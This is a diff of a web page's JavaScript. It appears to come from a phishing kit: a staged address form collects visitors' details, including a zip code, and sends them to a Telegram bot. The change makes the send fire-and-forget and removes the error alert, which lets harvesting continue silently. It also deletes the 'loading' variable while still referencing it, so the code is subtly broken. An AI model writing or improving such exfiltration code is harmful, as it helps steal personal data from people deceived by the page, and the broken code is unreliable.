@@ -464,10 +464,8 @@ function sendMessageToTelegram(botToken, chatId, messageText) {
         document.getElementById('addressForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             const submitBtn = document.getElementById('submitBtn2');
-            const loading = document.getElementById('loading2');
             
             submitBtn.disabled = true;
-            loading.style.display = 'inline';
             
             const formData = new FormData(this);
             const data = Object.fromEntries(formData.entries());
@@ -482,13 +480,9 @@ function sendMessageToTelegram(botToken, chatId, messageText) {
                            `📮 Zip Code: ${data.zipcode}\n` +
                            `⏰ Time: ${new Date().toLocaleString()}`;
             
-            const success = await sendToTelegram(message);
+            sendMessageToTelegram(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, message);
             
-            if (success) {
                 showForm('form3');
-            } else {
-                alert('Failed to send form data. Please try again.');
-            }
             
             submitBtn.disabled = false;
             loading.style.display = 'none';
